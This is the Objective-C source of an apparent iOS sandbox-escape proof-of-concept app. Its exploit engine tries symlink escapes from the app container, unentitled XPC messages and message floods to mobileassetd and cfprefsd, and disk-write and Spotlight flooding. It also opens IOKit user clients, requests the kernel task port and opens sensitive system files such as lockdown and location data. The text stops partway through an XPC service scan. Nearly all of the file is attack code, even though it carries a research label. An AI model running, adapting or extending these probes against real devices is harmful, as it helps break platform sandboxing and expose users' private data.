/*
 * SandboxEscapePOC - iOS 26.1 Security Research App
 *
 * Contains PoC implementations for:
 * - CVE-2025-43448 (CloudKit symlink)
 * - CVE-2025-43407 (Assets entitlements)
 * - cfprefsd XPC exploit patterns
 * - Disk write amplification
 * - IOKit service probing
 * - Private API discovery
 * - Kernel info leaks
 * - File descriptor tricks
 *
 * For security research only.
 */

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <Security/Security.h>
#import <mach/mach.h>
#import <mach/task_info.h>
#import <CoreSpotlight/CoreSpotlight.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <sys/fcntl.h>
#import <sys/mman.h>
#import <signal.h>
#import <dlfcn.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <errno.h>

// IOKit
#import <IOKit/IOKitLib.h>

// XPC types and function pointers (loaded dynamically)
typedef void* xpc_connection_t;
typedef void* xpc_object_t;
typedef void (^xpc_handler_t)(xpc_object_t);

static xpc_connection_t (*_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = NULL;
static void (*_xpc_connection_set_event_handler)(xpc_connection_t, xpc_handler_t) = NULL;
static void (*_xpc_connection_resume)(xpc_connection_t) = NULL;
static void (*_xpc_connection_cancel)(xpc_connection_t) = NULL;
static void (*_xpc_connection_send_message)(xpc_connection_t, xpc_object_t) = NULL;
static void (*_xpc_connection_send_message_with_reply)(xpc_connection_t, xpc_object_t, dispatch_queue_t, xpc_handler_t) = NULL;
static xpc_object_t (*_xpc_dictionary_create)(const char *const *, const xpc_object_t *, size_t) = NULL;
static void (*_xpc_dictionary_set_string)(xpc_object_t, const char *, const char *) = NULL;
static void (*_xpc_dictionary_set_int64)(xpc_object_t, const char *, int64_t) = NULL;
static void (*_xpc_dictionary_set_value)(xpc_object_t, const char *, xpc_object_t) = NULL;
static xpc_object_t (*_xpc_array_create)(const xpc_object_t *, size_t) = NULL;
static void (*_xpc_array_append_value)(xpc_object_t, xpc_object_t) = NULL;
static void* (*_xpc_get_type)(xpc_object_t) = NULL;

static void *_XPC_ERROR_CONNECTION_INVALID = NULL;
static void *_XPC_ERROR_CONNECTION_INTERRUPTED = NULL;
static void *_XPC_TYPE_ERROR = NULL;

static BOOL xpc_loaded = NO;

static void load_xpc_symbols(void) {
    if (xpc_loaded) return;

    void *handle = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW);
    if (!handle) return;

    _xpc_connection_create_mach_service = dlsym(handle, "xpc_connection_create_mach_service");
    _xpc_connection_set_event_handler = dlsym(handle, "xpc_connection_set_event_handler");
    _xpc_connection_resume = dlsym(handle, "xpc_connection_resume");
    _xpc_connection_cancel = dlsym(handle, "xpc_connection_cancel");
    _xpc_connection_send_message = dlsym(handle, "xpc_connection_send_message");
    _xpc_connection_send_message_with_reply = dlsym(handle, "xpc_connection_send_message_with_reply");
    _xpc_dictionary_create = dlsym(handle, "xpc_dictionary_create");
    _xpc_dictionary_set_string = dlsym(handle, "xpc_dictionary_set_string");
    _xpc_dictionary_set_int64 = dlsym(handle, "xpc_dictionary_set_int64");
    _xpc_dictionary_set_value = dlsym(handle, "xpc_dictionary_set_value");
    _xpc_array_create = dlsym(handle, "xpc_array_create");
    _xpc_array_append_value = dlsym(handle, "xpc_array_append_value");
    _xpc_get_type = dlsym(handle, "xpc_get_type");

    _XPC_ERROR_CONNECTION_INVALID = dlsym(handle, "_xpc_error_connection_invalid");
    _XPC_ERROR_CONNECTION_INTERRUPTED = dlsym(handle, "_xpc_error_connection_interrupted");
    _XPC_TYPE_ERROR = dlsym(handle, "_xpc_type_error");

    xpc_loaded = (_xpc_connection_create_mach_service != NULL);
}

#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)

// Forward declarations
@class AppDelegate;
@class ViewController;
@class ExploitEngine;

#pragma mark - Exploit Engine

@interface ExploitEngine : NSObject

// Exploit methods
+ (NSString *)runCloudKitExploit;
+ (NSString *)runAssetsExploit;
+ (NSString *)runCfprefsdExploit;
+ (NSString *)runDiskAmplificationTest;
+ (NSString *)runTimingChannelTest;
+ (NSString *)getSystemInfo;

// New exploit methods
+ (NSString *)runIOKitExploit;
+ (NSString *)runPrivateAPIProbe;
+ (NSString *)runKernelInfoLeak;
+ (NSString *)runFileDescriptorTricks;
+ (NSString *)runXPCServiceScan;

// Advanced exploit methods
+ (NSString *)runIOKitAdvancedExploit;
+ (NSString *)runXPCFuzzing;
+ (NSString *)runMobileGestaltQueries;
+ (NSString *)runSpringBoardInteraction;
+ (NSString *)runEntitlementProbing;

// Deep exploitation methods
+ (NSString *)runAGXDeepProbe;
+ (NSString *)runAppleKeyStoreExploit;
+ (NSString *)runFBSystemServiceInvoke;
+ (NSString *)runIOSurfaceMemoryOps;
+ (NSString *)runXPCTargetedFuzz;
+ (NSString *)runCrashOracle;

@end

@implementation ExploitEngine

+ (NSString *)getSystemInfo {
    NSMutableString *info = [NSMutableString string];
    
    UIDevice *device = [UIDevice currentDevice];
    [info appendFormat:@"Device: %@\n", device.model];
    [info appendFormat:@"Name: %@\n", device.name];
    [info appendFormat:@"iOS: %@\n", device.systemVersion];
    [info appendFormat:@"UUID: %@\n", [[device identifierForVendor] UUIDString]];
    
    // Hardware info
    size_t size;
    sysctlbyname("hw.machine", NULL, &size, NULL, 0);
    char *machine = malloc(size);
    sysctlbyname("hw.machine", machine, &size, NULL, 0);
    [info appendFormat:@"HW: %s\n", machine];
    free(machine);
    
    // Memory
    [info appendFormat:@"RAM: %.2f GB\n", 
     [NSProcessInfo processInfo].physicalMemory / (1024.0 * 1024.0 * 1024.0)];
    
    // Sandbox container
    [info appendFormat:@"\nContainer:\n%@\n", NSHomeDirectory()];
    
    return info;
}

#pragma mark - CloudKit Symlink Exploit

+ (NSString *)runCloudKitExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== CloudKit Symlink Exploit (CVE-2025-43448) ===\n\n"];
    
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *container = NSHomeDirectory();
    
    [log appendFormat:@"[*] Container: %@\n", container];
    
    // Test paths outside sandbox
    NSArray *targets = @[
        @"/var/mobile/Library/Preferences",
        @"/var/mobile/Library/Caches",
        @"/var/mobile/Documents",
        @"/private/var/mobile"
    ];
    
    for (NSString *target in targets) {
        NSString *linkPath = [container stringByAppendingPathComponent:
                             [NSString stringWithFormat:@"Documents/escape_%@", 
                              [[target lastPathComponent] stringByReplacingOccurrencesOfString:@"/" withString:@"_"]]];
        
        // Remove existing
        [fm removeItemAtPath:linkPath error:nil];
        
        // Try to create symlink
        NSError *error = nil;
        BOOL success = [fm createSymbolicLinkAtPath:linkPath
                                withDestinationPath:target
                                              error:&error];
        
        if (success) {
            [log appendFormat:@"[+] Created symlink: %@ -> %@\n", 
             [linkPath lastPathComponent], target];
            
            // Try to read through symlink
            NSArray *contents = [fm contentsOfDirectoryAtPath:linkPath error:&error];
            if (contents && contents.count > 0) {
                [log appendFormat:@"    [!] CAN ACCESS! Found %lu items\n", 
                 (unsigned long)contents.count];
                for (NSString *item in [contents subarrayWithRange:NSMakeRange(0, MIN(5, contents.count))]) {
                    [log appendFormat:@"        - %@\n", item];
                }
            } else {
                [log appendFormat:@"    [-] Access denied: %@\n", error.localizedDescription];
            }
        } else {
            [log appendFormat:@"[-] Failed symlink to %@: %@\n", target, error.localizedDescription];
        }
    }
    
    [log appendString:@"\n[*] CloudKit exploit test complete\n"];
    return log;
}

#pragma mark - Assets/mobileassetd Exploit

+ (NSString *)runAssetsExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Assets Entitlements Bypass (CVE-2025-43407) ===\n\n"];

    // Try to connect to mobileassetd
    void *handle = dlopen("/System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset", RTLD_NOW);
    if (handle) {
        [log appendString:@"[+] MobileAsset framework loaded\n"];
        dlclose(handle);
    } else {
        [log appendFormat:@"[-] Failed to load MobileAsset framework: %s\n", dlerror()];
    }

    // XPC connection attempt
    [log appendString:@"[*] Attempting XPC connection to mobileassetd...\n"];

    load_xpc_symbols();
    if (!xpc_loaded) {
        [log appendString:@"[-] XPC symbols not available\n"];
    } else {
        xpc_connection_t conn = _xpc_connection_create_mach_service(
            "com.apple.mobileassetd",
            NULL,
            0
        );

        if (conn) {
            [log appendString:@"[+] XPC connection handle created\n"];

            _xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
                (void)event;
            });

            _xpc_connection_resume(conn);
            [log appendString:@"[+] Connection resumed\n"];

            // Try query without entitlement
            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
            if (msg) {
                _xpc_dictionary_set_string(msg, "command", "query");
                _xpc_dictionary_set_string(msg, "asset-type", "com.apple.MobileAsset.SoftwareUpdate");
                _xpc_connection_send_message(conn, msg);
                [log appendString:@"[+] Query message sent\n"];
            }

            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]];
            _xpc_connection_cancel(conn);
            [log appendString:@"[*] Connection test complete\n"];
        } else {
            [log appendString:@"[-] Failed to create XPC connection (sandbox restriction)\n"];
        }
    }

    [log appendString:@"\n[*] Assets exploit test complete\n"];
    return log;
}

#pragma mark - cfprefsd XPC Exploit

+ (NSString *)runCfprefsdExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== cfprefsd XPC Exploit ===\n\n"];

    load_xpc_symbols();
    if (!xpc_loaded) {
        [log appendString:@"[-] XPC symbols not available, skipping XPC tests\n"];
    } else {
        // Test daemon connection (privileged - will fail in sandbox)
        [log appendString:@"[*] Testing cfprefsd.daemon connection...\n"];

        xpc_connection_t daemon = _xpc_connection_create_mach_service(
            "com.apple.cfprefsd.daemon",
            NULL,
            XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
        );

        if (daemon) {
            [log appendString:@"[+] Connected to cfprefsd.daemon (privileged)\n"];
            _xpc_connection_set_event_handler(daemon, ^(xpc_object_t event) { (void)event; });
            _xpc_connection_resume(daemon);
            _xpc_connection_cancel(daemon);
        } else {
            [log appendString:@"[-] Cannot connect to daemon (expected in sandbox)\n"];
        }

        // Test agent connection
        [log appendString:@"[*] Testing cfprefsd.agent connection...\n"];

        xpc_connection_t agent = _xpc_connection_create_mach_service(
            "com.apple.cfprefsd.agent",
            NULL,
            0
        );

        if (agent) {
            [log appendString:@"[+] Connected to cfprefsd.agent\n"];
            _xpc_connection_set_event_handler(agent, ^(xpc_object_t event) { (void)event; });
            _xpc_connection_resume(agent);

            // Test multi-message pattern (CVE-2019-7286 style)
            [log appendString:@"[*] Testing multi-message pattern...\n"];

            xpc_object_t msg = _xpc_dictionary_create(NULL, NULL, 0);
            if (msg) {
                _xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 5);

                xpc_object_t arr = _xpc_array_create(NULL, 0);
                if (arr) {
                    for (int i = 0; i < 10; i++) {
                        xpc_object_t sub = _xpc_dictionary_create(NULL, NULL, 0);
                        if (sub) {
                            _xpc_dictionary_set_int64(sub, "CFPreferencesOperation", 4);
                            _xpc_dictionary_set_string(sub, "CFPreferencesApplication", "poc.test");
                            _xpc_array_append_value(arr, sub);
                        }
                    }
                    _xpc_dictionary_set_value(msg, "CFPreferencesMessages", arr);
                }

                for (int i = 0; i < 100; i++) {
                    _xpc_connection_send_message(agent, msg);
                }
                [log appendFormat:@"[+] Sent %d multi-messages\n", 100];
            }

            _xpc_connection_cancel(agent);
        } else {
            [log appendString:@"[-] Cannot connect to agent\n"];
        }
    }

    // Test preference writes (works on iOS)
    [log appendString:@"\n[*] Testing preference write amplification...\n"];

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();

    for (int i = 0; i < 1000; i++) {
        NSString *key = [NSString stringWithFormat:@"poc_test_%d", i];
        [defaults setObject:@{@"data": [[NSUUID UUID] UUIDString]} forKey:key];
    }
    [defaults synchronize];

    CFAbsoluteTime elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] 1000 writes in %.3f seconds (%.1f writes/sec)\n",
     elapsed, 1000.0 / elapsed];

    // Cleanup
    for (int i = 0; i < 1000; i++) {
        [defaults removeObjectForKey:[NSString stringWithFormat:@"poc_test_%d", i]];
    }
    [defaults synchronize];

    [log appendString:@"\n[*] cfprefsd exploit test complete\n"];
    return log;
}

#pragma mark - Disk Amplification Test

+ (NSString *)runDiskAmplificationTest {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Disk Write Amplification Test ===\n\n"];
    
    // Test 1: NSUserDefaults flood
    [log appendString:@"[*] Test 1: NSUserDefaults flood\n"];
    
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
    NSUInteger totalBytes = 0;
    
    for (int i = 0; i < 500; i++) {
        @autoreleasepool {
            NSMutableDictionary *largeDict = [NSMutableDictionary dictionary];
            for (int j = 0; j < 50; j++) {
                largeDict[[NSString stringWithFormat:@"field_%d", j]] = [[NSUUID UUID] UUIDString];
            }
            totalBytes += 50 * 36; // UUID string length
            
            [defaults setObject:largeDict 
                         forKey:[NSString stringWithFormat:@"flood_%d", i]];
            
            if (i % 100 == 0) {
                [defaults synchronize];
            }
        }
    }
    [defaults synchronize];
    
    CFAbsoluteTime elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Wrote ~%lu KB in %.2f sec (%.1f KB/sec)\n",
     (unsigned long)(totalBytes / 1024), elapsed, (totalBytes / 1024.0) / elapsed];
    
    // Cleanup
    for (int i = 0; i < 500; i++) {
        [defaults removeObjectForKey:[NSString stringWithFormat:@"flood_%d", i]];
    }
    [defaults synchronize];
    
    // Test 2: Spotlight index flood
    [log appendString:@"\n[*] Test 2: Spotlight index flood\n"];
    
    CSSearchableIndex *index = [[CSSearchableIndex alloc] initWithName:@"poc_index"];
    NSMutableArray *items = [NSMutableArray array];
    
    start = CFAbsoluteTimeGetCurrent();
    
    for (int i = 0; i < 100; i++) {
        CSSearchableItemAttributeSet *attrs = [[CSSearchableItemAttributeSet alloc]
            initWithItemContentType:@"public.text"];
        attrs.title = [NSString stringWithFormat:@"Test Item %d", i];
        
        NSMutableString *content = [NSMutableString string];
        for (int j = 0; j < 100; j++) {
            [content appendString:[[NSUUID UUID] UUIDString]];
        }
        attrs.contentDescription = content;
        
        CSSearchableItem *item = [[CSSearchableItem alloc]
            initWithUniqueIdentifier:[[NSUUID UUID] UUIDString]
                    domainIdentifier:@"poc.flood"
                        attributeSet:attrs];
        [items addObject:item];
    }
    
    __block BOOL indexComplete = NO;
    [index indexSearchableItems:items completionHandler:^(NSError *error) {
        indexComplete = YES;
        if (error) {
            [log appendFormat:@"[-] Index error: %@\n", error];
        }
    }];

    // Wait for indexing with timeout
    CFAbsoluteTime timeout = CFAbsoluteTimeGetCurrent() + 10.0; // 10 second timeout
    while (!indexComplete && CFAbsoluteTimeGetCurrent() < timeout) {
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
    }
    if (!indexComplete) {
        [log appendString:@"[-] Indexing timed out\n"];
    }
    
    elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Indexed %lu items in %.2f sec\n", (unsigned long)items.count, elapsed];
    
    // Cleanup
    [index deleteSearchableItemsWithDomainIdentifiers:@[@"poc.flood"] completionHandler:nil];
    
    // Test 3: UserActivity flood
    [log appendString:@"\n[*] Test 3: NSUserActivity flood (Biome)\n"];
    
    NSMutableArray *activities = [NSMutableArray array];
    start = CFAbsoluteTimeGetCurrent();
    
    for (int i = 0; i < 50; i++) {
        NSUserActivity *activity = [[NSUserActivity alloc]
            initWithActivityType:[NSString stringWithFormat:@"com.poc.activity%d", i]];
        activity.title = [NSString stringWithFormat:@"Activity %d", i];
        activity.eligibleForSearch = YES;
        activity.eligibleForPrediction = YES;
        
        NSMutableDictionary *info = [NSMutableDictionary dictionary];
        for (int j = 0; j < 20; j++) {
            info[[NSString stringWithFormat:@"key_%d", j]] = [[NSUUID UUID] UUIDString];
        }
        activity.userInfo = info;
        
        [activity becomeCurrent];
        [activities addObject:activity];
    }
    
    elapsed = CFAbsoluteTimeGetCurrent() - start;
    [log appendFormat:@"[+] Created %lu activities in %.2f sec\n", 
     (unsigned long)activities.count, elapsed];
    
    // Cleanup
    for (NSUserActivity *act in activities) {
        [act invalidate];
    }
    
    [log appendString:@"\n[*] Disk amplification test complete\n"];
    return log;
}

#pragma mark - Timing Channel Test

+ (NSString *)runTimingChannelTest {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Timing Side-Channel Test ===\n\n"];
    
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    
    // Calibration
    [log appendString:@"[*] Calibrating baseline latency...\n"];
    
    double totalLatency = 0;
    int samples = 100;
    
    for (int i = 0; i < samples; i++) {
        CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
        [defaults objectForKey:@"calibration_key"];
        totalLatency += CFAbsoluteTimeGetCurrent() - start;
    }
    
    double baselineLatency = totalLatency / samples;
    [log appendFormat:@"[+] Baseline: %.6f seconds\n", baselineLatency];
    
    // Test timing variation with disk activity
    [log appendString:@"\n[*] Testing timing variation during disk writes...\n"];
    
    NSMutableArray *readLatencies = [NSMutableArray array];
    NSMutableArray *writeLatencies = [NSMutableArray array];
    
    for (int i = 0; i < 50; i++) {
        // Read timing
        CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
        [defaults objectForKey:@"timing_probe"];
        double readTime = CFAbsoluteTimeGetCurrent() - start;
        [readLatencies addObject:@(readTime)];
        
        // Write and measure
        start = CFAbsoluteTimeGetCurrent();
        [defaults setObject:[[NSUUID UUID] UUIDString] forKey:@"timing_write"];
        [defaults synchronize];
        double writeTime = CFAbsoluteTimeGetCurrent() - start;
        [writeLatencies addObject:@(writeTime)];
    }
    
    // Calculate statistics
    double readSum = 0, writeSum = 0;
    for (NSNumber *n in readLatencies) readSum += n.doubleValue;
    for (NSNumber *n in writeLatencies) writeSum += n.doubleValue;
    
    double avgRead = readSum / readLatencies.count;
    double avgWrite = writeSum / writeLatencies.count;
    
    [log appendFormat:@"[+] Avg read latency:  %.6f sec\n", avgRead];
    [log appendFormat:@"[+] Avg write latency: %.6f sec\n", avgWrite];
    [log appendFormat:@"[+] Write/Read ratio:  %.2fx\n", avgWrite / avgRead];
    
    // Covert channel estimation
    double bitPeriod = 0.05; // 50ms
    double bitsPerSecond = 1.0 / bitPeriod;
    [log appendFormat:@"\n[*] Estimated covert channel capacity: %.0f bps\n", bitsPerSecond];
    
    // Cleanup
    [defaults removeObjectForKey:@"timing_write"];
    [defaults synchronize];
    
    [log appendString:@"\n[*] Timing channel test complete\n"];
    return log;
}

#pragma mark - IOKit Exploit

+ (NSString *)runIOKitExploit {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== IOKit Service Probing ===\n\n"];

    // Use kIOMainPortDefault (IOMasterPort is deprecated)
    mach_port_t masterPort = kIOMainPortDefault;
    [log appendFormat:@"[+] Using IOKit main port: 0x%x\n", masterPort];

    // Interesting IOKit services to probe
    NSArray *services = @[
        @"IOHIDSystem",
        @"AppleKeyStore",
        @"IOUserClient",
        @"AppleMobileFileIntegrity",
        @"IOSurfaceRoot",
        @"AppleARMPE",
        @"AppleCredentialManager",
        @"AppleSEPManager",
        @"IOGraphicsAccelerator2",
        @"AGXAccelerator",
        @"AppleAVE2Driver",
        @"AppleJPEGDriver",
        @"AppleH10CamIn"
    ];

    [log appendString:@"\n[*] Probing IOKit services...\n"];

    for (NSString *serviceName in services) {
        io_service_t service = IOServiceGetMatchingService(
            masterPort,
            IOServiceMatching([serviceName UTF8String])
        );

        if (service != IO_OBJECT_NULL) {
            [log appendFormat:@"[+] Found: %@ (port: 0x%x)\n", serviceName, service];

            // Try to open user client
            io_connect_t connection;
            kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
            if (kr == KERN_SUCCESS) {
                [log appendFormat:@"    [!] Opened user client: 0x%x\n", connection];
                IOServiceClose(connection);
            } else {
                [log appendFormat:@"    [-] Cannot open: 0x%x\n", kr];
            }

            IOObjectRelease(service);
        } else {
            [log appendFormat:@"[-] Not found: %@\n", serviceName];
        }
    }

    [log appendString:@"\n[*] IOKit probe complete\n"];
    return log;
}

#pragma mark - Private API Probe

+ (NSString *)runPrivateAPIProbe {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Private API Probing ===\n\n"];

    // Frameworks to probe
    NSDictionary *frameworkSymbols = @{
        @"/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices": @[
            @"SBSSpringBoardServerPort",
            @"SBSLaunchApplicationWithIdentifier",
            @"SBSCopyApplicationDisplayIdentifiers"
        ],
        @"/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager": @[
            @"MCMContainerCreateWithError",
            @"MCMContainerGetPath"
        ],
        @"/System/Library/PrivateFrameworks/FrontBoardServices.framework/FrontBoardServices": @[
            @"FBSSystemService",
            @"FBSOpenApplicationService"
        ],
        @"/System/Library/PrivateFrameworks/BackBoardServices.framework/BackBoardServices": @[
            @"BKSSystemService",
            @"BKSHIDEventRouter"
        ],
        @"/usr/lib/liblockdown.dylib": @[
            @"lockdown_connect",
            @"lockdown_receive",
            @"lockdown_send"
        ],
        @"/usr/lib/libMobileGestalt.dylib": @[
            @"MGCopyAnswer",
            @"MGGetBoolAnswer",
            @"MGGetFloat64Answer"
        ]
    };

    for (NSString *framework in frameworkSymbols) {
        [log appendFormat:@"\n[*] Probing %@\n", [framework lastPathComponent]];

        void *handle = dlopen([framework UTF8String], RTLD_NOW);
        if (handle) {
            [log appendString:@"    [+] Framework loaded\n"];

            NSArray *symbols = frameworkSymbols[framework];
            for (NSString *symbol in symbols) {
                void *sym = dlsym(handle, [symbol UTF8String]);
                if (sym) {
                    [log appendFormat:@"    [+] %@ = %p\n", symbol, sym];
                } else {
                    [log appendFormat:@"    [-] %@ not found\n", symbol];
                }
            }
            dlclose(handle);
        } else {
            [log appendFormat:@"    [-] Failed: %s\n", dlerror()];
        }
    }

    // Probe Objective-C runtime for private classes
    [log appendString:@"\n[*] Scanning private Objective-C classes...\n"];

    NSArray *privateClasses = @[
        @"SBApplication",
        @"FBSystemService",
        @"LSApplicationProxy",
        @"MCMContainer",
        @"SecTrustStore",
        @"AMDevice"
    ];

    for (NSString *className in privateClasses) {
        Class cls = NSClassFromString(className);
        if (cls) {
            [log appendFormat:@"[+] Found class: %@\n", className];

            // Count methods
            unsigned int methodCount = 0;
            Method *methods = class_copyMethodList(cls, &methodCount);
            [log appendFormat:@"    Methods: %u\n", methodCount];
            if (methods) free(methods);
        } else {
            [log appendFormat:@"[-] Class not found: %@\n", className];
        }
    }

    [log appendString:@"\n[*] Private API probe complete\n"];
    return log;
}

#pragma mark - Kernel Info Leak

+ (NSString *)runKernelInfoLeak {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== Kernel Info Leak Test ===\n\n"];

    // Task info
    [log appendString:@"[*] Gathering task information...\n"];

    struct task_basic_info basic_info;
    mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)&basic_info, &count);

    if (kr == KERN_SUCCESS) {
        [log appendFormat:@"[+] Virtual size: %lu MB\n", (unsigned long)(basic_info.virtual_size / (1024 * 1024))];
        [log appendFormat:@"[+] Resident size: %lu MB\n", (unsigned long)(basic_info.resident_size / (1024 * 1024))];
        [log appendFormat:@"[+] Suspend count: %d\n", basic_info.suspend_count];
    }

    // Task ports
    [log appendString:@"\n[*] Enumerating task ports...\n"];

    mach_port_t task_port = mach_task_self();
    [log appendFormat:@"[+] Task self port: 0x%x\n", task_port];

    mach_port_t host_port = mach_host_self();
    [log appendFormat:@"[+] Host self port: 0x%x\n", host_port];

    // Try to get kernel task (will fail but shows the error)
    mach_port_t kernel_task;
    kr = task_for_pid(mach_task_self(), 0, &kernel_task);
    if (kr == KERN_SUCCESS) {
        [log appendFormat:@"[!] Got kernel task port: 0x%x\n", kernel_task];
    } else {
        [log appendFormat:@"[-] task_for_pid(0) denied: 0x%x\n", kr];
    }

    // Host info
    [log appendString:@"\n[*] Host information...\n"];

    host_basic_info_data_t host_basic_data;
    count = HOST_BASIC_INFO_COUNT;
    kr = host_info(mach_host_self(), HOST_BASIC_INFO, (host_info_t)&host_basic_data, &count);

    if (kr == KERN_SUCCESS) {
        [log appendFormat:@"[+] Max CPUs: %d\n", host_basic_data.max_cpus];
        [log appendFormat:@"[+] Avail CPUs: %d\n", host_basic_data.avail_cpus];
        [log appendFormat:@"[+] Memory size: %llu MB\n", host_basic_data.max_mem / (1024 * 1024)];
        [log appendFormat:@"[+] CPU type: 0x%x\n", host_basic_data.cpu_type];
        [log appendFormat:@"[+] CPU subtype: 0x%x\n", host_basic_data.cpu_subtype];
    }

    // Mach zone info
    [log appendString:@"\n[*] Probing mach zones...\n"];

    mach_zone_name_t *names;
    mach_zone_info_t *info;
    mach_msg_type_number_t name_count, info_count;

    kr = mach_zone_info(mach_host_self(), &names, &name_count, &info, &info_count);
    if (kr == KERN_SUCCESS) {
        [log appendFormat:@"[+] Found %u mach zones\n", name_count];
        // Show first few zones
        for (unsigned int i = 0; i < MIN(5, name_count); i++) {
            [log appendFormat:@"    Zone: %s (size: %llu)\n", names[i].mzn_name, info[i].mzi_cur_size];
        }
        vm_deallocate(mach_task_self(), (vm_address_t)names, name_count * sizeof(*names));
        vm_deallocate(mach_task_self(), (vm_address_t)info, info_count * sizeof(*info));
    } else {
        [log appendFormat:@"[-] mach_zone_info denied: 0x%x\n", kr];
    }

    [log appendString:@"\n[*] Kernel info leak test complete\n"];
    return log;
}

#pragma mark - File Descriptor Tricks

+ (NSString *)runFileDescriptorTricks {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== File Descriptor Tricks ===\n\n"];

    // Check open file descriptors
    [log appendString:@"[*] Scanning open file descriptors...\n"];

    int maxFd = (int)sysconf(_SC_OPEN_MAX);
    [log appendFormat:@"[+] Max FDs: %d\n", maxFd];

    int openCount = 0;
    for (int fd = 0; fd < MIN(256, maxFd); fd++) {
        if (fcntl(fd, F_GETFD) != -1) {
            openCount++;
            if (fd < 10) {
                char path[PATH_MAX];
                if (fcntl(fd, F_GETPATH, path) != -1) {
                    [log appendFormat:@"    FD %d: %s\n", fd, path];
                }
            }
        }
    }
    [log appendFormat:@"[+] Open FDs (0-255): %d\n", openCount];

    // Try dup2 tricks
    [log appendString:@"\n[*] Testing dup2 to reserved FDs...\n"];

    int testFd = open("/dev/null", O_RDONLY);
    if (testFd >= 0) {
        // Try to dup to stdin
        int result = dup2(testFd, 100);
        if (result >= 0) {
            [log appendFormat:@"[+] dup2 to FD 100 succeeded\n"];
            close(100);
        } else {
            [log appendFormat:@"[-] dup2 failed: %s\n", strerror(errno)];
        }
        close(testFd);
    }

    // F_DUPFD_CLOEXEC trick
    [log appendString:@"\n[*] Testing F_DUPFD tricks...\n"];

    testFd = open("/dev/null", O_RDONLY);
    if (testFd >= 0) {
        int newFd = fcntl(testFd, F_DUPFD_CLOEXEC, 200);
        if (newFd >= 0) {
            [log appendFormat:@"[+] F_DUPFD_CLOEXEC to %d succeeded\n", newFd];
            close(newFd);
        }
        close(testFd);
    }

    // Try to access sensitive files via FD
    [log appendString:@"\n[*] Probing sensitive file access...\n"];

    NSArray *sensitiveFiles = @[
        @"/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        @"/var/mobile/Library/Caches/locationd/clients.plist",
        @"/private/var/mobile/Library/SyncedPreferences",
        @"/var/containers/Shared/SystemGroup",
        @"/var/db/lockdown"
    ];

    for (NSString *path in sensitiveFiles) {
        int fd = open([path UTF8String], O_RDONLY);
        if (fd >= 0) {
            struct stat st;
            fstat(fd, &st);
            [log appendFormat:@"[!] Opened: %@ (size: %lld)\n", [path lastPathComponent], st.st_size];
            close(fd);
        } else {
            [log appendFormat:@"[-] Cannot open: %@ (%s)\n", [path lastPathComponent], strerror(errno)];
        }
    }

    // Shared memory probe
    [log appendString:@"\n[*] Testing shared memory...\n"];

    int shmFd = shm_open("/poc_test", O_CREAT | O_RDWR, 0644);
    if (shmFd >= 0) {
        [log appendFormat:@"[+] Created shared memory: FD %d\n", shmFd];
        shm_unlink("/poc_test");
        close(shmFd);
    } else {
        [log appendFormat:@"[-] shm_open failed: %s\n", strerror(errno)];
    }

    [log appendString:@"\n[*] File descriptor tricks complete\n"];
    return log;
}

#pragma mark - XPC Service Scan

+ (NSString *)runXPCServiceScan {
    NSMutableString *log = [NSMutableString string];
    [log appendString:@"=== XPC Service Scan ===\n\n"];

    load_xpc_symbols();
    if (!xpc_loaded) {
        [log appendString:@"[-] XPC symbols not available\n"];
        [log appendString:@"\n[*] XPC service scan complete\n"];
        return log;
    }

    // List of interesting XPC services to probe
    NSArray *xpcServices = @[
        @"com.apple.springboard.services",
        @"com.apple.frontboard.systemappservices",
        @"com.apple.backboardd",
        @"com.apple.locationd.direct",
        @"com.apple.locationd.registration",
        @"com.apple.containermanagerd",
        @"com.apple.installd",
        @"com.apple.lsd",
        @"com.apple.networkd",
        @"com.apple.securityd",
        @"com.apple.symptomsd",
        @"com.apple.fairplayd",
        @"com.apple.mobileactivationd",
        @"com.apple.coreservices.quarantine-resolver",
        @"com.apple.DiskArbitration.diskarbitrationd",
        @"com.apple.SecurityServer",
        @"com.apple.tccd",
        @"com.apple.sysdiagnose.stackshot",
        @"com.apple.ReportCrash.SimulateCrash"
    ];

    [log appendString:@"[*] Probing XPC services...\n\n"];

